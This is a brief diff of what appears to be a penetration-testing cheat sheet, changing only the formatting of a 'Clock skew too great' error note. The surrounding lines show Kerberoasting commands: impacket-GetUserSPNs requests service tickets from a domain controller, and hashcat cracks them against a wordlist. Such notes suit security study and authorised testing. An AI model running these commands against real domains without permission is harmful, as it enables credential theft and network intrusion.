@@ -382,7 +382,7 @@ hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
 ```
-Clock skew too great Error
+>Clock skew too great Error
 ```
 sudo timedatectl set-ntp off
 sudo rdate -n 10.10.10.100
